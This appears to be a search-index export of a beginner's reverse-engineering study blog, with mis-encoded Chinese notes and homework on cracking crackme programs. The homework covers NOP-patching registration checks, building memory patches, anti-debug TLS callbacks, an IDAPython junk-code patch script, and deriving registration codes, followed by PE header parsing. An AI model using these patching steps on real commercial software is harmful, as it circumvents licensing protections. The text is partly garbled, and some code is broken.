{"/about/":{"data":{"":"\nAbout me\nğŸŒ´Beginner in the realm of binary security\nğŸ› ï¸It is often said that a family that accumulates good deeds will surely have abundant blessings\nğŸ—½With loyal determination, uphold modesty and retreat\nğŸ¥²Stop scolding, stop scolding, if you keep scolding me, Iâ€™ll become foolish"},"title":"About"},"/docs/crack/crack/":{"data":{"":"","#":"æµç¨‹ ç¨‹åºæ‰§è¡Œçš„é€»è¾‘å¯ä»¥ç†è§£ä¸ºå¦‚ä¸‹ï¼š\ngraph TB A[ç‚¹å‡»æ³¨å†ŒæŒ‰é’®] --\u003e B[è¯»å–æ³¨å†Œç ]; B --\u003e C[åˆ¤æ–­æ³¨å†Œç æ˜¯å¦åˆæ³•]; C --T--\u003e D[æç¤ºç”¨æˆ·æ˜¯å¦æ³¨å†ŒæˆåŠŸ]; C --F--\u003e F[æç¤ºç”¨æˆ·æ˜¯å¦æ³¨å†Œå¤±è´¥]; F --\u003e C[åˆ¤æ–­æ³¨å†Œç æ˜¯å¦åˆæ³•]; D --\u003e C[åˆ¤æ–­æ³¨å†Œç æ˜¯å¦åˆæ³•]; å…³é”®å°±æ˜¯åˆ¤æ–­æ³¨å†Œç æ˜¯å¦åˆæ³•è¿™ä¸€æ­¥ã€‚\nä¸»è¦å…¶å®å°±æ˜¯è®©ç¨‹åºæ–­åœ¨æ³¨å†Œå¤±è´¥çš„ä½ç½®ï¼Œç„¶åå•æ­¥è·Ÿç¨‹åºè¿”å›åˆ°åˆ¤æ–­çš„ä½ç½®ã€‚å¦‚æœæç¤ºæ˜¯å¼¹çª—çš„è¯å°±å¯ä»¥ä¸‹æ–­åœ¨MessageBoxAçš„æœ€åé¢ã€‚\nIDAé‡Œé¢è¿›è¡Œä¸­æ–‡æœç´¢ï¼šåœ¨ç›®æ ‡ä¸­æ·»åŠ åç¼€-dCULTURE=all\nè°ƒè¯• è¿›ç¨‹ä¸çº¿ç¨‹æ˜¯å®¿ä¸»ä¸å¯„å®¿è€…çš„å…³ç³»ï¼Œä¸€ä¸ªæä¾›èµ„æºï¼Œä¸€ä¸ªä½¿ç”¨èµ„æºã€‚\nè°ƒè¯•å¯„å­˜å™¨\néœ€è¦æ³¨æ„çš„å¦‚ä¸‹ï¼š\nDR0-DR3\nè¿™å››ä¸ªå¯„å­˜å™¨ç”¨äºå­˜å‚¨æœ€å¤šå››ä¸ªç¡¬ä»¶æ–­ç‚¹çš„çº¿æ€§åœ°å€\nDR6\nDR6å¯„å­˜å™¨æ˜¯è°ƒè¯•çŠ¶æ€å¯„å­˜å™¨ï¼Œç”¨äºæŒ‡ç¤ºè°ƒè¯•å¼‚å¸¸ (#DB) å‘ç”Ÿçš„åŸå› å’ŒçŠ¶æ€\nL0, L1, L2, L3\nè¿™å››ä¸ªä½åˆ†åˆ«å¯¹åº”4ä¸ªç¡¬ä»¶æ–­ç‚¹ï¼ˆDR0 ~ DR3ï¼‰ï¼Œç”¨äºæ§åˆ¶æ–­ç‚¹åœ¨ä»…å¯¹å½“å‰ä»»åŠ¡ï¼ˆæˆ–å½“å‰çº¿ç¨‹ï¼‰å±‚é¢æ˜¯å¦ç”Ÿæ•ˆã€‚å½“ä»»åŠ¡åˆ‡æ¢æ—¶ï¼Œè¿™äº›æ–­ç‚¹ä¼šè¢«è‡ªåŠ¨æ¸…é™¤æˆ–å¤±æ•ˆã€‚\nG0, G1, G2, G3\nè¿™å››ä¸ªä½ä¹Ÿåˆ†åˆ«å¯¹åº”4ä¸ªç¡¬ä»¶æ–­ç‚¹ï¼ˆDR0 ~ DR3ï¼‰ï¼Œç”¨äºæ§åˆ¶æ–­ç‚¹åœ¨â€œå…¨å±€â€å±‚é¢ï¼ˆåœ¨æ‰€æœ‰ä»»åŠ¡ä¸­éƒ½ç”Ÿæ•ˆï¼Œä¸éšä»»åŠ¡åˆ‡æ¢è€Œå¤±æ•ˆï¼‰æ˜¯å¦å¯ç”¨ã€‚\nå…³äºDr7=1å¯ä»¥æ–­ï¼ŒDr7=2æ–­ä¸ä¸‹æ¥ï¼Ÿçš„æ€è€ƒï¼š\nç”±äºGxæ˜¯è®¾ç½®å…¨å±€æ–­ç‚¹çš„ï¼Œè®¾ç½®çš„ç¡¬ä»¶æ–­ç‚¹å°†åœ¨æ‰€æœ‰ä»»åŠ¡å’Œè¿›ç¨‹ä¸­éƒ½æœ‰æ•ˆï¼Œå¤§å¤šæ•°æ“ä½œç³»ç»Ÿä¸ä¼šè®©ä½ çœŸæ­£åœ°å¯¹å…¨å±€æ–­ç‚¹ç”Ÿæ•ˆï¼Œè¦ä¹ˆç›´æ¥å¿½ç•¥ï¼Œè¦ä¹ˆåœ¨ä¸‹ä¸€æ¬¡åˆ‡æ¢æˆ–å†™å¯„å­˜å™¨æ—¶æ¸…æ‰é‚£ä¸ªGxä½ï¼Œå¯¼è‡´å®é™…æ‰§è¡Œæ—¶å¹¶æ²¡æœ‰å¼€å¯ç¡¬ä»¶æ–­ç‚¹ï¼Œäºæ˜¯â€œæ–­ä¸ä¸‹æ¥â€ã€‚ä¸€èˆ¬è®¾ç½®Lxå°±å¯ä»¥äº†ã€‚\nå¸¦å£³è°ƒè¯• å£³çš„åŠ è½½è¿‡ç¨‹ï¼š\ngraph TB A[è¿è¡Œç¨‹åº] --\u003e B[åœ¨å†…å­˜ä¸­åå‡ºçœŸæ­£çš„çš„ä»£ç ]; B --\u003e C[è½¬åˆ°çœŸå®çš„OEP]; C --\u003e D[æ‰§è¡ŒçœŸå®çš„ä»£ç ]; D --\u003e E[æ‰§è¡Œåˆ°æˆ‘ä»¬éœ€è¦ä¸‹æ–­ç‚¹çš„ä½ç½®]; åœ¨å£³è§£ç åçš„æ–­ç‚¹å¯ä»¥ä¸‹CreatWindowExAï¼ŒLoadLibraryAã€‚åœ¨å¯¹åº”ä½ç½®ä¸‹ç¡¬ä»¶è®¿é—®æ–­ç‚¹å¯ä»¥çœ‹åˆ°å£³æ˜¯åœ¨ä»€ä¹ˆä½ç½®ç»™æˆ‘ä»¬åä»£ç çš„ã€‚\næ³¨æ„ä¸‹æ–­ç‚¹æ—¶CreatWindowExAä¸CreatWindowExWéƒ½ä¸‹ï¼Œä¸æ˜¯æ‰€æœ‰çš„Aéƒ½è°ƒç”¨W\nèŠ±æŒ‡ä»¤ èŠ±æŒ‡ä»¤çš„æ€è·¯ï¼šæ„é€ æ’æˆç«‹çš„è·³è½¬ï¼Œä¸­é—´æ’æ— æ•ˆæ•°æ®ã€‚èŠ±æŒ‡ä»¤é˜²IDAï¼Œé˜²ä¸äº†åŠ¨æ€è°ƒè¯•ã€‚ å»èŠ±æŒ‡ä»¤çš„è¯å¯ä»¥åœ¨IDAä¸­è°ƒè¯•ï¼Œé‡åˆ°å°è·³çš„è·³è¿‡å»ï¼Œç„¶åæŠŠå½“å‰æŒ‡ä»¤çš„ä¸Šé¢ç›´åˆ°æ¯”è¾ƒçš„æŒ‡ä»¤å…¨éƒ¨nopæ‰å°±è¡Œ TLSï¼ˆçº¿ç¨‹å±€éƒ¨å­˜å‚¨ï¼‰ ç‰¹å¾ï¼šå…ˆäºOEPæ‰§è¡Œ\nå‡½æ•°è§£é‡Šï¼š\nNtSetInformationThreadï¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°æ—¶ï¼Œå¦‚æœåœ¨ç¬¬äºŒä¸ªå‚æ•°é‡ŒæŒ‡å®š0x11è¿™ä¸ªå€¼ï¼ˆæ„æ€æ˜¯ThreadHideFromDebuggerï¼‰ï¼Œç­‰äºå‘Šè¯‰æ“ä½œç³»ç»Ÿï¼Œå°†æ‰€æœ‰é™„åŠ çš„è°ƒè¯•å™¨ç»Ÿç»Ÿå–æ¶ˆæ‰ã€‚\nNtQueryInformationProcessï¼šå®ƒçš„ç¬¬äºŒä¸ªå‚æ•°å¯ä»¥ç”¨æ¥æŸ¥è¯¢è¿›ç¨‹çš„è°ƒè¯•ç«¯å£ã€‚å¦‚æœè¿›ç¨‹è¢«è°ƒè¯•ï¼Œé‚£ä¹ˆè¿”å›çš„ç«¯å£å€¼ä¼šæ˜¯-1ï¼Œå¦åˆ™å°±æ˜¯å…¶ä»–çš„å€¼ã€‚\nåè°ƒè¯•æ¡ˆä¾‹ï¼š\n#include \u003cwindows.h\u003e #include \u003cstdio.h\u003e #include \"ntdll/ntdll.h\" #pragma comment(linker,\"/INCLUDE:_tls_used\") DWORD isDebug = 0; void NTAPI TLS_CALLBACK(PVOID DLLHandle,DWORD Reason,PVOID Reserved) { if(Reason == DLL_PROCESS_ATTACH){ NtSetInformationThread(GetCurrentThread(), ThreadHideFromDebugger, 0, 0); NtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, (PVOID)\u0026isDebug, sizeof(DWORD), NULL); } } int main() { MessageBoxA(NULL,\"hello\",\"hello\",MB_OK); return 0; } #pragma data_seg(\".CRT$XLX\") PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = {TLS_CALLBACK,NULL}; #pragma data_seg() æ˜“è¯­è¨€ç‰¹å¾ç  å­—ç¬¦ä¸²æ¯”è¾ƒå‡½æ•°ç‰¹å¾ç ï¼štest edx,0x3\nmov edx,dword ptr ss:[esp+0x4] mov ecx,dword ptr ss:[esp+0x8] test edx,edx test edx,0x3 æ–­ä¸‹åæ³¨æ„è§‚å¯ŸECXä¸EDX\næŒ‰é’®äº‹ä»¶ç‰¹å¾ç ï¼šFF55FC5F5E\næ˜“è¯­è¨€ä½“ç‰¹å¾ç ï¼šFF25\næå–ç‰¹å¾ç åŸºæœ¬åŸåˆ™ ä¸€å®šä¸èƒ½åŒ…å«ç»å¯¹åœ°å€ï¼Œå¦‚æœæœ‰ï¼Œä¸€å®šè¦æ¢æˆé€šé…ç¬¦ æœ‰CALLä¹Ÿä¸è¡Œï¼Œå¦‚æœæœ‰ï¼Œä¹Ÿè¦æ¢æˆé€šé…ç¬¦ æœ‰å¸¸é‡ä¹Ÿä¸è¡Œï¼Œå¦‚æœæœ‰ï¼Œä¹Ÿè¦æ¢æˆé€šé…ç¬¦ "},"title":"Crack"},"/docs/crack/crackext/":{"data":{"":"","#":"IDAä¿®æ”¹é”™è¯¯ ä¿®æ”¹è¿”å›å€¼æ˜¯å“ªä¸ªå¯„å­˜å™¨ï¼šint __usercall sub_401020\u003cedx\u003e() å£³ åˆ†ç±»ï¼š åŸºäºPEæ–‡ä»¶çš„ä¿æŠ¤ï¼šä»£ç ä¼šåœ¨ç¨‹åºè¿è¡ŒååŸå°ä¸åŠ¨çš„åå›å» åŸºäºä»£ç çš„ä¿æŠ¤ï¼šåå›å»çš„ä»£ç è¿˜æ˜¯çœ‹ä¸æ‡‚çš„ä»£ç  åè°ƒè¯• åˆ†æä¸€ä¸‹ï¼Œæ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼Œéœ€è¦è·å–_TEBæ‰€ä»¥è¦å¯¼å…¥ä¸‹é¢çš„å¤´æ–‡ä»¶ï¼š\n#include \u003cwinternl.h\u003e BOOL check() { wchar_t *Buffer; int i; bool tmp; Buffer = NtCurrentTeb()-\u003eProcessEnvironmentBlock-\u003eProcessParameters-\u003eCommandLine.Buffer; i = 256; do { if (!i) break; tmp = *Buffer++ == 0; --i; } while (!tmp); return *(Buffer - 2) != ' '; } é€šè¿‡_TEBé‡Œé¢çš„_PEBè·å–è¿›ç¨‹å¯åŠ¨æ—¶çš„å‘½ä»¤è¡Œç¼“å†²åŒºï¼Œåº”è¯¥æ˜¯å®ƒçš„å¯åŠ¨å‚æ•°ã€‚ä¹‹åæ£€æŸ¥å€’æ•°ç¬¬äºŒä¸ªå­—ç¬¦ï¼Œå› ä¸ºæœªè°ƒè¯•æ—¶ï¼ŒæŸäº›åŠ è½½å™¨æˆ–å¯åŠ¨é…ç½®å¯èƒ½ä¼šåœ¨å‘½ä»¤è¡Œå°¾éƒ¨ä¿ç•™ä¸€ä¸ªç©ºæ ¼ï¼›ä½†æ˜¯åŒå‡»å¯åŠ¨çš„ç¨‹åºåé¢ä¸ä¼šæœ‰å‚æ•°ã€‚\nä¼ªè°ƒè¯• å¤§è‡´åŸç†ï¼š\nä¸ä½¿ç”¨æ­£å¸¸çš„0xCCæˆ–è€…ç¡¬ä»¶æ–­ç‚¹ï¼Œè‡ªå·±å®šä¹‰ä¸€ä¸ªæ–­ç‚¹æ–¹å¼ï¼ˆé¡µå¼‚å¸¸ï¼Œhookç­‰ï¼‰ï¼Œç„¶åæ¥ç®¡ç¨‹åºçš„æ‰€æœ‰çš„æ–­ç‚¹ä»¥åŠè°ƒè¯•APIè°ƒç”¨ç­‰ï¼Œè½¬è¿‡æ¥è‡ªå·±å®ç°ã€‚\nRSA åŠ å¯†ï¼šæ˜æ–‡ ^ e mod n = å¯†æ–‡\nè§£å¯†ï¼šå¯†æ–‡ ^ d mod n = æ˜æ–‡\nnçš„æ¥æºï¼šä»»æ„ä¸¤ä¸ªäº’è´¨æ•°çš„ä¹˜ç§¯ã€‚æ¯”å¦‚n = p * q\neçš„æ¥æºï¼šéšæœºå–å€¼ï¼Œåªéœ€è¦æ»¡è¶³1\u003ce\u003cf(p,q)\ndçš„æ¥æºï¼še * d mod f(p,q) = 1ï¼Œå¯ä»¥æ¨å‡ºdï¼Œæ¬§å‡ é‡Œå¾—å®šç†"},"title":"CrackEXT"},"/docs/homework/crack-homework/":{"data":{"":"","#":"2 ç”¨å››ç§æ–¹æ³•å®šä½åˆ°æœ¬ç¨‹åºå…³é”®ç ´è§£ä½ç½®å¹¶çˆ†ç ´ ä¸‹å‡½æ•°æ–­ç‚¹åœ¨MessageBoxAåé¢ï¼Œä¹‹åå‘åè·Ÿåˆ°å†æ¬¡æ¯”è¾ƒçš„ä½ç½®æ˜¯0x42FB03ï¼Œå°†å®ƒNOPå°±ä¸ä¼šè·³åˆ°é”™è¯¯çš„ä½ç½®äº†ã€‚ åœ¨idaä¸­æœå­—ç¬¦ä¸²å¯ä»¥æ‰¾åˆ°æ˜¯Tserial_button1Click@\u003ceax\u003eå‡½æ•°ã€‚ 3 çˆ†ç ´è¿™ä¸ªç¨‹åºï¼Œå¹¶ä¸”åšå‡ºå†…å­˜è¡¥ä¸\nè¿˜æ˜¯ä¸‹å‡½æ•°æ–­ç‚¹åœ¨MessageBoxAåé¢ï¼Œå¯ä»¥çœ‹åˆ°å…³é”®è·³æ˜¯0x004010FDã€‚æˆ‘ä½¿ç”¨çš„æ˜¯Baymax Patch Toolsï¼Œè®¾ç½®å¼‚å¸¸ä¸­æ–­è¡¥ä¸ï¼Œç”±äºä¸å¤ªä¼šè®¾ç½®è™šæ‹Ÿåœ°å€ä»€ä¹ˆçš„ï¼Œæˆ‘ç›´æ¥ç”¨ç‰¹å¾ç è¿›è¡Œç¡¬ä»¶æ–­ç‚¹çš„è®¾ç½®ä¸º0F 84 39 00 00 00ï¼ˆå°±æ˜¯é‚£ä¸ªå…³é”®è·³çš„æœºå™¨ç ï¼‰ï¼Œè¡¥ä¸ç±»å‹ä¸ºä¿®æ”¹eipã€‚ä¿å­˜å‡ºæ¥ä¹‹åå…ˆæ‰§è¡Œè¡¥ä¸ï¼Œä¹‹åå°±æˆäº†ã€‚\n4 æ˜“è¯­è¨€ï¼š\nçº¿ç¨‹_å¯åŠ¨ (\u0026å­ç¨‹åº1, , ) è¿”å› (0) .å­ç¨‹åº å­ç¨‹åº1 .å¾ªç¯åˆ¤æ–­é¦– () .å¾ªç¯åˆ¤æ–­å°¾ (å†…å­˜è¯»å†™.è¯»å­—èŠ‚ (åˆ°æ•´æ•° (è¿›ç¨‹_å–è‡ªè¿›ç¨‹ID ()), è¿›åˆ¶_åå…­åˆ°å (â€œ4010f0â€)) â‰  83) å†…å­˜è¯»å†™.å†™å­—èŠ‚é›† (åˆ°æ•´æ•° (è¿›ç¨‹_å–è‡ªè¿›ç¨‹ID ()), è¿›åˆ¶_åå…­åˆ°å (â€œ4010fdâ€), { 144, 144, 144, 144, 144, 144 }) cè¯­è¨€å®ç°çš„åŸç†ä¸€æ ·ã€‚\n5 ä¸ä¿®æ”¹ä»£ç ç ´è§£æœ¬ç¨‹åºï¼Œéœ€è¯´æ˜åˆ†ææ€è·¯ä»¥åŠè§£å†³é—®é¢˜çš„ä»£ç \nè¿™ä¸ªçš„ç¨‹åºæ¯”è¾ƒè¾“å‡ºçš„ä½ç½®æ˜¯ç¨‹åºçš„çª—å£åç§°ï¼ˆSetWindowTextAï¼‰ï¼ŒF8ä¹‹åå¯ä»¥çœ‹åˆ°æ˜¯åœ°å€0x0401053åœ¨æ¯”è¾ƒï¼Œè€Œä¸”ç‰¹å¾ç ä¸º0F 85 51 00 00 00ï¼Œä¹‹åå°±å’Œä¹‹å‰ä¸€æ ·å†™ä¸€ä¸ªå¼‚å¸¸è¡¥ä¸å°±å¥½äº†ï¼Œè®°ä½è¿è¡Œè¡¥ä¸å‰ä¸€å®šè¦å…³è°ƒè¯•å™¨ã€‚\n6 è¿™ä¸ªé¢˜é¦–å…ˆæ˜¯æ˜“è¯­è¨€å†™çš„ã€‚è€Œä¸”è¿™ä¸ªç¨‹åºçš„æ³¨å†Œé€»è¾‘æ˜¯å°†ç”¨æˆ·è¾“å…¥çš„Keyå†™åˆ°æœ¬åœ°æ–‡ä»¶ä¸­ï¼Œä¹‹åæ¯æ¬¡å¯åŠ¨ä¹‹åè¿›è¡Œæ¯”è¾ƒã€‚\næ˜“è¯­è¨€çš„ç‰¹æ€§åº”è¯¥æ˜¯é¦–å…ˆä¼šæ‰§è¡ŒAPI GetVersionã€‚ç”±äºè¿™ä¸ªç¨‹åºåŠ äº†å£³ï¼Œæ‰€ä»¥éœ€è¦å°†çœŸå®çš„ä»£ç åå‡ºæ¥ï¼Œå°±åœ¨GetVersionä¸Šä¸‹æ–­ç‚¹ã€‚é€šè¿‡å­—ç¬¦ä¸²æœç´¢å‘ç°æœ‰\\\\License.Keyï¼Œåº”è¯¥æ˜¯ä¸Šé¢è¯´ä¿å­˜çš„æœ¬åœ°æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±æ–­åœ¨è¿™é‡Œçœ‹ä¸€ä¸‹ï¼ˆ0x004016D6ï¼Œå…¶å®å°±æ˜¯å…ˆæ–­åœ¨GetVersionå°†ä»£ç åå‡ºæ¥ï¼Œç„¶åæ–­åœ¨0x004016D6ï¼Œä½†æ˜¯ä¸€å®šè¦å¯ç”¨æ–­ç‚¹ï¼Œè°ƒè¯•å™¨æ¯”è¾ƒæ±‡ç¼–æŒ‡ä»¤å˜åŒ–åä¼šè‡ªåŠ¨å°†è¿™ä¸ªæ–­ç‚¹ç¦ç”¨ï¼‰ã€‚å¾€ä¸‹æ‰¾å¤§è·³è½¬ï¼Œåœ¨0x00401895ä½ç½®ï¼Œç›´æ¥nopæ‰ï¼Œå‡ºäº†ã€‚\n7 è®¡ç®—å‡ºæ­£ç¡®çš„æ³¨å†Œç ã€‚å¹¶ä¸”æ³¨å†ŒæˆåŠŸ\nç›´æ¥åˆ°æ³¨å†Œæ§ä»¶çš„å¤„ç†å‡½æ•°ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æ ¸å¿ƒçš„ä»£ç å¦‚ä¸‹ï¼š\n*v6 = GetDlgItemInt(hWnd, 1000, 0, 1); sprintf(Buffer, \"%d\", v6[0]); sub_401000(*v6); è¿™ä¸ª*v6åº”è¯¥å°±æ˜¯è¯»å–ç”¨æˆ·è¾“å…¥çš„æ•°å€¼ï¼Œé‚£ä¹ˆåœ¨sub_401000å°±æ˜¯éªŒè¯ç”¨æˆ·è¾“å…¥çš„å‡½æ•°ï¼š\nresult = a1 * (a1 - 23) == -102; if ( a1 * (a1 - 23) == -102 ) { result = a1 * a1 * a1; if ( result == 0x1331 ) return MessageBoxW(0, \"m`æ·¯`O\", \u0026Caption, 0); } return result; } ç®—ä¸€ä¸‹åº”è¯¥æ˜¯17\n8 å»èŠ±æŒ‡ä»¤çš„è¯å¯ä»¥åœ¨IDAä¸­è°ƒè¯•ï¼Œé‡åˆ°å°è·³çš„è·³è¿‡å»ï¼Œç„¶åæŠŠå½“å‰æŒ‡ä»¤çš„ä¸Šé¢ç›´åˆ°æ¯”è¾ƒçš„æŒ‡ä»¤å…¨éƒ¨nopæ‰å°±è¡Œï¼š\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp) { char v3; // [esp+0h] [ebp-11Ch] char v4; // [esp+0h] [ebp-11Ch] char Str1[136]; // [esp+10h] [ebp-10Ch] BYREF char Str[132]; // [esp+98h] [ebp-84h] BYREF meun(); memset(Str, 0, 0x80u); memset(Str1, 0, 0x80u); while ( 1 ) { memset(Str, 0, 0x80u); memset(Str1, 0, 0x80u); output(\"\\n\", v3); scanf(\u0026aS_0, Str); encode(Str, Str1, 128); strcmp(Str1, \"((++**--,,//..QQPP\"); printf(\"\\n\\næ³¨å†Œå¤±è´¥\\n\\n\", v4); } } å…¶ä¸­encodeï¼š\nconst char* bcc[] = \"bcdaren\"; int __cdecl encode(const char *Str, char *Str1, unsigned int 128) { signed int v4; size_t j; signed int i; if ( !Str ) return -1; if ( !Str1 || !128 ) return -1; if ( strlen(Str) \u003c= 128 ) v4 = strlen(Str); else v4 = 128; for ( i = 0; i \u003c v4; ++i ) { for ( j = 0; j \u003c strlen(\"bcdaren\"); ++j ) Str1[i] = bcc[j] ^ (Str[i] + 13); } return 0; } è¿™ä¸ªforå¾ªç¯é‡Œé¢çš„jåªæ˜¯ä¸åœçš„åŠ ä»¥ï¼Œä½†æ˜¯æœ€åä¸å˜çš„å°±æ˜¯æœ€åçš„å­—æ¯nï¼Œé€†è¿ç®—åº”è¯¥ä¸ºï¼š\n// for ( i = 0; i \u003c v4; ++i ) // { // Str1[i] = 'n' ^ (Str[i] + 13); // } for ( i = 0; i \u003c v4; ++i ) { Str1[i] = (Str[i] ^ 'n') - 13; } //åº”è¯¥å¯ä»¥ç†è§£ä¸ºç­‰å¼çš„ç§»é¡¹a=b+13,é‚£ä¹ˆb=a-13ï¼Œç„¶åäº¤æ¢ä¸€ä¸‹å˜é‡ä½ç½®é‚£ä¹ˆa=b-13å°±æ˜¯é€†è¿ç®—äº† é‚£ä¹ˆè¾“å…¥((++**--,,//..QQPPè¿›è¡Œè§£å¯†å°±å¯ä»¥äº†ã€‚\n#include \u003cwindows.h\u003e #include \u003cstdio.h\u003e int __cdecl encode(const char *Str, char *Str1) { signed int v4; size_t j; signed int i; if ( !Str ) return -1; if ( !Str1 || !128 ) return -1; if ( strlen(Str) \u003c= 128 ) v4 = strlen(Str); else v4 = 128; for ( i = 0; i \u003c v4; ++i ) { for ( j = 0; j \u003c strlen(\"bcdaren\"); ++j ) Str1[i] = (Str[i] ^ 'n') - 13; } return 0; } int main() { char decoded_str[256] = {0}; encode(\"((++**--,,//..QQPP\",decoded_str); printf(\"%s\",decoded_str); return 0; } 9 ç®—å‡ºæ­£ç¡®çš„æ³¨å†Œç ï¼ˆflag{â€¦â€¦}ï¼‰\nè¿™é‡Œçš„åè°ƒè¯•å°±æ˜¯TLSé‡Œé¢æœ‰é˜»æ­¢è°ƒè¯•å™¨æ¥æ”¶æ¶ˆæ¯ä¸æ£€æµ‹æ˜¯å¦è¢«è°ƒè¯•çš„åŠŸèƒ½ã€‚\nç›´æ¥æ‰¾å›è°ƒå‡½æ•°ï¼Œä½†æ˜¯ç®—æ³•æˆ‘æ˜¯çœŸçš„ä¸ä¼šå‘€ã€‚\n10 patchè„šæœ¬æˆ‘ç”¨idaè‡ªå¸¦çš„pythonå†™çš„ï¼š\nåœ¨File -\u003e Script commandæ‰¾åˆ°ï¼Œè®°å¾—è¦å°†ä¸‹é¢çš„IDCæ”¹ä¸ºPythonï¼š\nstartaddr = 0x00402000 endaddr = 0x00402200 for i in range(startaddr,endaddr): if get_wide_byte(i) == 0xE8 and get_wide_byte(i+1) == 0x00 and get_wide_byte(i+6) == 0x04 and get_wide_byte(i+12) == 0xC3: for j in range(0,0x1C): patch_byte(i+j,0x90) if get_wide_byte(i) == 0xE8 and get_wide_byte(i+1) == 0x01 and get_wide_byte(i+6) == 0x83 and get_wide_byte(i+7) == 0x04: for k in range(0,0xA): patch_byte(i+k,0x90) "},"title":"Crack-homework"},"/docs/homework/homework/":{"data":{"":"","#":"PEç»“æ„ å†…å­˜åˆ†é…â€”æ–‡ä»¶è¯»å†™ å°†è®°äº‹æœ¬çš„.exeæ–‡ä»¶è¯»å–åˆ°å†…å­˜ï¼Œå¹¶è¿”å›è¯»å–ååœ¨å†…å­˜ä¸­çš„åœ°å€\n#include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e void* load(const char* file_path, size_t* size) { FILE* file = fopen(file_path, \"rb\"); if (!file) { return NULL; } fseek(file, 0, SEEK_END); *size = ftell(file); fseek(file, 0, SEEK_SET); void* memory = malloc(*size); if (!memory) { fclose(file); return NULL; } size_t read_size = fread(memory, 1, *size, file); if (read_size != *size) { free(memory); fclose(file); return NULL; } fclose(file); return memory; } int main() { const char* path = \"C:\\\\Windows\\\\notepad.exe\"; size_t size = 0; void* file_memory = load(path, \u0026size); if (file_memory) { printf(\"address: %p\\n\", file_memory); printf(\"size: %zu bytes\\n\", size); } free(file_memory); } return 0; } å°†å†…å­˜ä¸­çš„æ•°æ®å­˜å‚¨åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œï¼ˆ.exeæ ¼å¼ï¼‰ï¼Œç„¶ååŒå‡»æ‰“å¼€ï¼Œçœ‹æ˜¯å¦èƒ½å¤Ÿä½¿ç”¨\nint main() { const char* lpszFile = \"output.exe\"; FILE *pFile = NULL; FILE* fpw = fopen_s(\u0026pFile, lpszFile, \"rb\"); if(!fpw) { return 0; } if (fwrite(pMemBuffer, 1, size, fpw) == 0) { return 0; } fclose(fpw);\tfpw = NULL; return size; } PEå¤´è§£æ 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 D8 00 00 00| 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F 74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20 6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00 31 42 8C CE 75 23 E2 9D 75 23 E2 9D 75 23 E2 9D F6 3F EC 9D 7B 23 E2 9D 43 05 E8 9D 43 23 E2 9D 75 23 E3 9D 46 23 E2 9D 17 3C F1 9D 76 23 E2 9D 43 05 E9 9D 76 23 E2 9D 52 69 63 68 75 23 E2 9D 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 50 45 00 00 |4C 01 05 00 4A 11 BE 54 00 00 00 00 00 00 00 00 E0 00 0E 01| 0B 01 06 00 00 10 02 00 00 A0 00 00 00 00 00 00 20 12 00 00 00 10 00 00 00 10 00 00 00 00 40 00 00 10 00 00 00 10 00 00 04 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 C0 02 00 00 10 00 00 00 00 00 00 03 00 00 00 00 00 10 00 00 10 00 00 00 00 10 00 00 10 00 00 00 00 00 00 10 00 00 00 ä»¥è¿™ä¸ªä¸ºä¾‹å§\næ‰¾å‡ºæ‰€æœ‰DOCå¤´æ•°æ®ï¼Œå¹¶ç»Ÿè®¡DOCå¤´å¤§å°\ne_magic = 4D 5A e_cblp = 90 00 e_cp = 03 00 e_crlc = 00 00 e_cparhdr = 04 00 e_minalloc = 00 00 e_maxalloc = FF FF e_ss = 00 00 e_sp = B8 00 e_csum = 00 00 e_ip = 00 00 e_cs = 00 00 e_lfarlc = 40 00 e_ovno = 00 00 e_res[4] = 00 00,00 00,00 00,00 00 e_oemid = 00 00 e_oeminfo = 00 00 e_res2[10] = 00 00,00 00,00 00,00 00,00 00,00 00,00 00,00 00,00 00,00 00 e_lfanew = D8 00 00 00 æ‰¾å‡ºæ‰€æœ‰æ ‡å‡†PEå¤´æ•°æ®ï¼Œå¹¶ç»Ÿè®¡æ ‡å‡†PEå¤´å¤§å°\nSignature = 00 00 Machine = 4C 01 NumberOfSection = 05 00 TimeDateStamp = 4A 11 BE 54 PointerToSymbolTable = 00 00 00 00 NumberOfSymbols = 00 00 00 00 SizeOfOptionalHeader = E0 00 Characteristics = 0E 01 æ‰¾å‡ºæ‰€æœ‰å¯é€‰PEå¤´æ•°æ®ï¼Œå¹¶ç»Ÿè®¡å¯é€‰PEå¤´å¤§å°\nMagic = 0B 01 MajorLinkerVersion = 06 MinorLinkerVersion = 00 SizeOfCode = 00 10 02 00 SizeOfInitializedData = 00 A0 00 00 SizeOfUninitializedData = 00 00 00 00 AddressOfEntryPoint = 20 12 00 00 BaseOfCode = 00 10 00 00 BaseOfData = 00 10 00 00 ImageBase = 00 00 40 00 SectionAlignment = 00 10 00 00 FileAlignment = 00 10 00 00 MajorOperatingSystemVersion = 04 00 MinorOperatingSystemVersion = 00 00 MajorImgdeVersion = 00 00 MinorImgdeVersion = 00 00 MajorSubsystemVersin = 04 00 MinorSubsystemVersin = 00 00 Win32VersionValue = 00 00 00 00 SizeOfImage = 00 C0 02 00 SizeOfHeaders = 00 10 00 00 CheckSum = 00 00 00 00 Subsystem = 03 00 DllCharacteristics = 00 00 SizeOfStackReserve = 00 00 10 00 SizeOfStackCommit = 00 10 00 00 SizeOfHeapReserve = 00 00 10 00 SizeOfHeapCommit = 00 10 00 00 LoadFlags = 00 00 00 00 NumberOfRvaAndSizes = 10 00 00 00 